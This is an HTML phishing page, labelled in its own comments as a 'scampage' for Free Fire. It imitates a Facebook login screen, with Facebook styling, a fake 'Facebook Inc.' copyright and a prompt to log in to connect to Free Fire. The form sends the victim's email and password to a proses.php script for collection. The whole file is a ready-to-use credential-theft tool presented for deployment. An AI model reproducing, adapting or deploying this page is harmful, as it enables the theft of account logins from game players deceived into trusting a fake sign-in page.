<!DOCTYPE html>
<html lang="id">
<head>
<!-- Author   : msversee -->
<!-- Name     : script scampage free fire -->
<!-- version  : 1.0.0 -->
<!-- Homepage : https://msversee.blogspot.com -->
<!-- Massage  : If there are any bugs or other issues, please fix them yourself. Don't be spoiled. -->
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Login Facebook</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        form {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            width: 300px;
        }

        label {
            display: block;
            margin-bottom: 5px;
        }

        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 8px;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box;
        }

        button[type="submit"] {
            width: 100%;
            padding: 10px;
            background-color: #1877f2;
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
        }

        button[type="submit"]:hover {
            background-color: #166fe5;
        }

        .language-box {
            width: 100%;
            margin-top: 10px;
            text-align: center;
        }

        .language-name {
            margin: 5px;
            color: #3b5998;
            font-size: 12px;
            font-family: Roboto;
            display: inline-block;
        }

        .language-name i {
            padding: 4px;
            color: #90949c;
            border: 1px solid #3b5998;
            border-radius: 3px;
        }

        .language-name-active {
            color: #90949c;
            font-weight: bold;
        }

        .copyright {
            margin-top: 10px;
            color: #90949c;
            font-size: 12px;
            font-family: Roboto;
        }

        .txt-create-account,
        .txt-not-now,
        .txt-forgotten-password {
            margin-top: 10px;
            color: #0000c;
            font-size: 16px;
            font-family: Roboto;
            text-align: center;
        }
    </style>
</head>
<body>
    <form action="proses.php" method="post">
        <center><img src="images/login/icon.png" width="20%" height="20%"></center>
        <p>Log in to your Facebook account to connect to Free Fire</p>
        <label for="email">Email:</label>
        <input type="email" name="email" id="email" />
        <label for="password">Kata Sandi:</label>
        <input type="password" name="password" id="password" />
        <button type="submit">Masuk</button>
        <div class="txt-create-account">Create account</div>
        <div class="txt-not-now">Not now</div>
        <div class="txt-forgotten-password">Forgotten password?</div>
        <div class="language-box">
            <div class="language-name language-name-active">English (UK)</div>
            <div class="language-name">Bahasa Indonesia</div>
            <div class="language-name">Basa Jawa</div>
            <div class="language-name">Bahasa Melayu</div>
            <div class="language-name">日本語</div>
            <div class="language-name">Español</div>
            <div class="language-name">Português (Brasil)</div>
            <div class="language-name">
                <i class="fa fa-plus"></i>
            </div>
        </div>
        <div class="copyright">Facebook Inc.</div>
    </form>
</body>
</html>